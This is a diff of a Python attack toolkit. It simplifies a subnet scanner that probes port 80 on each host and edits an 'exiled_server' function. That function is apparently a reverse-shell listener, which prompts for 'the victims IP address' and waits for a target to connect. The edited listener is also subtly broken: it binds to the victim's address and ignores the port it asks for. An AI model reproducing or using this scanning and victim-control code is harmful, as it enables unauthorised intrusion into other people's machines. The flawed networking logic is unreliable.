@@ -128,24 +128,14 @@ def main() :
 	def run(ipaddress, num, showErrors) :
 
 		try:
-			
-			if (ipaddress.lower() == "d") :
-				sock = socket.socket()
-				sock.connect(("192.168.1." + str(num),80))
-				print(termcolor.colored("[+]",'green') + "192.168.1." + str(num) + " is active")
-				sock.close()
-				
-			else :
-				sock = socket.socket()
-				sock.connect((ipaddress + str(num),80))
-				print(termcolor.colored("[+]",'green') + ipaddress + str(num) + " is active")
-				sock.close()
+
+			sock = socket.socket()
+			sock.connect((ipaddress + str(num),80))
+			print(termcolor.colored("[+]",'green') + ipaddress + str(num) + " is active")
+			sock.close()
 		except:
 			if (showErrors.lower() == "y") :
-				if (ipaddress.lower() == "d") : 
-					print (termcolor.colored("[-]", 'red') + "192.168.1." + str(num) + " is inactive")
-				else :
-					print (termcolor.colored("[-]", 'red') + ipaddress + str(num) + " is inactive")
+				print (termcolor.colored("[-]", 'red') + ipaddress + str(num) + " is inactive")
 		if (num == 255) :
 			currentProgram = "1"
 			backtomain(currentProgram)				
@@ -154,7 +144,6 @@ def main() :
 		for num in range(1,256) :
 			run(ipaddress, num, showErrors)
 	def ipscanner() :
-		print(termcolor.colored("[Ex:]", 'cyan') + " Enter D for 192.168.1.")
 		ipaddress = str(input(termcolor.colored("[#]", 'blue') + " Enter first 3 bits of ip address. i.e (123.123.123.) : "   + termcolor.colored("\n[>]", 'magenta') + " "))
 		showErrors = str(input(termcolor.colored("[#]", 'blue') + " Would you like to show closed connections? Y/N "   + termcolor.colored("\n[>]", 'magenta') + " "))
 
@@ -331,7 +320,9 @@ def main() :
 	def exiled_server() :
 		socket.setdefaulttimeout(None)
 		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		sock.bind(('192.168.1.2', 5555))
+		victimIP = input(termcolor.colored("[>]",'magenta') + str("What is the victims IP address?\n"))
+		victimPort = input(termcolor.colored("[>]",'magenta') + str("What port would you like to use?\n"))
+		sock.bind((victimIP, 5555))
 		print('[+] Listening For The Incoming Connections')
 		sock.listen(5)
 		target, ip = sock.accept()
